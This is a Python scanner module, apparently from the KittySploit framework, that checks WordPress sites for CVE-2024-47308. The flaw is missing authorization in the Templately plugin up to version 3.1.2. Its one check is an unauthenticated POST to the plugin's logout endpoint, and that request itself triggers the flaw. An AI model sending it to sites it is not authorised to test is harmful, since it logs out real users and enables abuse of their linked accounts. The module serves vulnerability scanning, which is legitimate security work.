#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Templately allow an attacker to logout users who signed in to their templately account, so you can sign in you."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Templately <= 3.1.2 - Broken Access Control Detection',
        'description': 'Templately allow an attacker to logout users who signed in to their templately account, so you can sign in your templately account to exploit this vulnerability. Go to http://IP/wordpress/wp-admin/admin.php?page=templately&path=sign-in to sign in then logout.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wpscan', 'wp-plugin', 'templately', 'wordpress', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/templately/templately-312-missing-authorization',
            'https://patchstack.com/database/vulnerability/templately/wordpress-templately-plugin-3-1-2-broken-access-control-vulnerability?_s_id=cve',
        ],
        'cve': 'CVE-2024-47308',
    }

    def run(self):
        path = '/wp-json/templately/v1/logout?_locale=user'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('status\\', 'success', 'message\\', 'Logged out.',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Templately <= 3.1.2 - Broken Access Control detected', path=path)
            return True
        return False

